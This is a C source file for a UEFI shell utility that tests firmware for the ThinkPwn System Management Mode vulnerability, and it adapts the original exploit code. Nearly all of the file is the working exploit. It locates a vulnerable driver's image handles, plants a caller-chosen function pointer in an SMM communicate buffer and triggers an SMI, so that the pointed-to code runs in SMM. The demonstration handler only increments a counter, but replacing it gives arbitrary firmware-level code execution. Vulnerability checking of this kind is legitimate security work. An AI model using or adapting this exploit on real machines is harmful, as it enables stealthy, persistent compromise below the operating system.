//
//  Copyright (c) 2016  Finnbarr P. Murphy.   All rights reserved.
//
//  Check SMM Write Access (Based on ThinkPwn code from Dmytro Oleksiuk) 
//
//  License: BSD License
//

#include <Uefi.h>
#include <FrameworkSmm.h>

#include <Uefi/UefiSpec.h>
#include <Guid/GlobalVariable.h>
#include <Guid/SmmCommunicate.h>

#include <Library/UefiLib.h>
#include <Library/ShellCEntryLib.h>
#include <Library/ShellLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/IoLib.h>
#include <Library/DevicePathLib.h>

#include <Protocol/EfiShell.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/SmmBase.h>
#include <Protocol/SmmAccess.h>

#define UTILITY_VERSION L"0.1"
#undef DEBUG

// image name for SystemSmmRuntimeRt UEFI driver
#define IMAGE_NAME L"FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E)"

// SMM communication data size
#define SMM_DATA_SIZE      0x1000

#define MAX_SMRAM_REGIONS  4
#define MAX_HANDLES        0x10
#define MAX_PATH           0x200

#define COMMUNICATE_GUID  \
     { 0x1279E288, 0x24CD, 0x47E9, {0x96, 0xBA, 0xD7, 0xA3, 0x8C, 0x17, 0xBD, 0x64 }}

typedef VOID (* EXPLOIT_HANDLER)(VOID *Context, VOID *Unknown, VOID *Data);

typedef struct
{
    VOID *Context;
    EXPLOIT_HANDLER Handler;
} EXPLOIT_STRUCT;

// struct addr is EFI_SMM_BASE_PROTOCOL + 0x58 
typedef struct
{
    EFI_HANDLE CallbackHandle;
    VOID *Data;
    UINTN *DataSize;
} COMMUNICATE_STRUCT;

UINTN gSmmHandlerExecuted = 0;


VOID 
FireSynchronousSmi( UINT8 Handler, 
                    UINT8 Data)
{
    // fire SMI using APMC I/O port
    IoWrite8((UINTN)0xb3, Data);
    IoWrite8((UINTN)0xb2, Handler);
}


VOID 
SmmHandler( VOID *Context, 
            VOID *Unknown, 
            VOID *Data)
{
    // SMM code executed tellatil
    gSmmHandlerExecuted += 1;
}


EFI_STATUS 
GetImageHandle( CHAR16 *TargetPath, 
                EFI_HANDLE *HandlesList, 
                UINTN *HandlesListCount)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_GUID gEfiLoadedImageProtocolGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
    EFI_HANDLE *Buffer = NULL;
    UINTN BufferSize = 0;    
    UINTN HandlesFound = 0;    
    EFI_LOADED_IMAGE *LoadedImage = NULL;
    CHAR16 *Path = NULL;

    // determinate handles buffer size
    Status = gBS->LocateHandle( ByProtocol,
                                &gEfiLoadedImageProtocolGuid,
                                NULL,
                                &BufferSize,
                                NULL);
    if (Status != EFI_BUFFER_TOO_SMALL) {
        Print(L"ERROR: LocateHandle [%d]\n", Status);
        return Status;
    }

    Buffer = AllocateZeroPool(BufferSize);
    if (!Buffer) {
        Print(L"ERROR: AllocatePool\n");
        return Status;
    }

    // get image handles list
    Status = gBS->LocateHandle( ByProtocol,
                                &gEfiLoadedImageProtocolGuid,
                                NULL,
                                &BufferSize,
                                Buffer);
    if (EFI_ERROR(Status)) {
        Print(L"ERROR: LocateHandle [%d]\n", Status);
        FreePool(Buffer); 
        return Status;
    }

    for (int i = 0; i < BufferSize / sizeof(EFI_HANDLE); i++) {
        LoadedImage = NULL;

        // get loaded image protocol instance for given image handle
        Status = gBS->HandleProtocol( Buffer[i],
                                      &gEfiLoadedImageProtocolGuid, 
                                      (VOID *)&LoadedImage);
        if (Status == EFI_SUCCESS) {
            // get and check image path
            if ((Path = ConvertDevicePathToText(LoadedImage->FilePath, TRUE, TRUE))) {
                if (!StrCmp(Path, TargetPath)) {
                    if (HandlesFound + 1 < *HandlesListCount) {
                        HandlesList[HandlesFound] = Buffer[i];
                        HandlesFound++;                        
                    } else {
                        // handle list is full
                        Status = EFI_BUFFER_TOO_SMALL;
                    }
                }

                FreePool(Path);                                        
                if (Status != EFI_SUCCESS) {
                    break;
                }
            }
        }
    }

    FreePool(Buffer); 

    if (Status == EFI_SUCCESS) {
        *HandlesListCount = HandlesFound;
    }

    return Status;
}


EFI_STATUS 
TrySmmExploit(EXPLOIT_HANDLER Handler)
{
    EFI_STATUS Status = EFI_SUCCESS;    
    EFI_GUID gEfiSmmBaseProtocolGuid = EFI_SMM_BASE_PROTOCOL_GUID;
    EFI_GUID gSmmCommunicateHeaderGuid = SMM_COMMUNICATE_HEADER_GUID;
    EFI_SMM_BASE_PROTOCOL *SmmBase = NULL;  
    EXPLOIT_STRUCT Struct;   
    UINTN DataSize = SMM_DATA_SIZE;
    EFI_SMM_COMMUNICATE_HEADER *Data = NULL;
    EFI_HANDLE HandlesList[MAX_HANDLES];
    UINTN HandlesListCount = MAX_HANDLES;
    EFI_HANDLE ImageHandle;

    ZeroMem(HandlesList, sizeof(HandlesList));
    gSmmHandlerExecuted = 0;

    // locate SMM base protocol
    Status = gBS->LocateProtocol( &gEfiSmmBaseProtocolGuid, 
                                  NULL,
                                  (VOID *) &SmmBase);
    if (EFI_ERROR(Status)) {
        Print(L"ERROR: Unable to locate SMM base protocol [%d]\n", Status);
        return Status;
    }

#ifdef DEBUG
    Print(L"SMM base protocol is at 0x%llx\n", SmmBase);    
#endif

    // allocate memory for SMM communication data
    Data = AllocateZeroPool( DataSize); 
    if (!Data) {
        Print(L"ERROR: AllocateZeroPool\n");
        return Status;
    }

#ifdef DEBUG
    Print(L"Buffer for SMM communicate call is allocated at 0x%llx\n", Data);    
#endif

    Print(L"Image handles for %S\n", IMAGE_NAME);

    Status = GetImageHandle(IMAGE_NAME, HandlesList, &HandlesListCount);
    if (EFI_ERROR(Status)) {
        Print(L"ERROR: GetImageHandle [%d]`\n", Status);
        goto _END;
    }

    if (HandlesListCount == 0) {
        Print(L"ERROR: No image handles found\n");
        goto _END;
    } 

    // try all image handles found. Break on success.
    for (int i = 0; i < HandlesListCount && gSmmHandlerExecuted == 0; i++) {
        ImageHandle = HandlesList[i];
                
        // set up data header
        DataSize = SMM_DATA_SIZE;
        ZeroMem(Data, DataSize);
        CopyMem(&Data->HeaderGuid, &gSmmCommunicateHeaderGuid, (UINTN)sizeof(EFI_GUID));                    
        Data->MessageLength = DataSize - sizeof(EFI_SMM_COMMUNICATE_HEADER);                

        // set up data body
        Struct.Context = NULL;
        Struct.Handler = Handler;
        *(VOID **)((UINT8 *)Data + 0x20) = (VOID *)&Struct;  

        // queue SMM communication call                
        Status = SmmBase->Communicate( SmmBase, 
                                       ImageHandle,
                                       Data,
                                       &DataSize);

        // process pending SMM communication calls  
        FireSynchronousSmi(0, 0);

        Print(L" * Handle: 0x%llx  SmmBase->Communicate returned status: %d  data size: 0x%x\n", 
              ImageHandle, Status, DataSize); 
    }     

    if (gSmmHandlerExecuted > 0) {
        Status = EFI_SUCCESS;
    } else {
        Status = EFI_UNSUPPORTED;     
    }                       

_END:
    if (Data) {
        FreePool(Data);
    }

    return Status;
}


VOID
Usage(CHAR16 *Str)
{
    Print(L"Usage: %s [-V|--version]\n", Str);
}


INTN
EFIAPI
ShellAppMain(UINTN Argc, CHAR16 **Argv)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_GUID gEfiSmmAccessProtocolGuid = EFI_SMM_ACCESS_PROTOCOL_GUID;
    EFI_SMM_ACCESS_PROTOCOL *SmmAccess = NULL;  
    EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
    UINTN SmramMapSize = sizeof(SmramMap);


    if (Argc == 2) {
        if (!StrCmp(Argv[1], L"--version") || 
            !StrCmp(Argv[1], L"-V")) {
            Print(L"Version: %s\n", UTILITY_VERSION);
            return Status;
        }
        if (!StrCmp(Argv[1], L"--help") ||
            !StrCmp(Argv[1], L"-h") ||
            !StrCmp(Argv[1], L"-?")) {
            Usage(Argv[0]);
            return Status;
        }
    }

    // catchall for all other cases
    if (Argc > 1) {
        Usage(Argv[0]);
        return Status;
    }

    // locate SMM access protocol
    Status = gBS->LocateProtocol( &gEfiSmmAccessProtocolGuid, 
                                  NULL,
                                  (VOID*) &SmmAccess);
    if (EFI_ERROR (Status)) {
        Print(L"ERROR: Unable to locate SMM access protocol [%d]\n", Status);
        return Status;
    }

#ifdef DEBUG
    Print(L"SMM access protocol is at 0x%llx\n", SmmAccess);
#endif

    // get SMRAM regions information
    Status = SmmAccess->GetCapabilities( SmmAccess, 
                                         &SmramMapSize,
                                         SmramMap);
    if (EFI_ERROR (Status)) {
        Print(L"ERROR: GetCapabilities [%d]\n", Status);
        return Status;
    }

    Print(L"Available SMRAM regions:\n");

    for (int i = 0; i < SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i++) {
        Print(L" * 0x%.8llx:0x%.8llx\n", 
               SmramMap[i].PhysicalStart,
               SmramMap[i].PhysicalStart + SmramMap[i].PhysicalSize - 1);
    }

    // Try the exploit
    if (TrySmmExploit(SmmHandler) == EFI_SUCCESS) {
        Print(L"\nEXPLOIT SUCCEEDED\n");
    } else {
        Print(L"\nEXPLOIT FAILED\n");
    }

    return EFI_SUCCESS;
} 
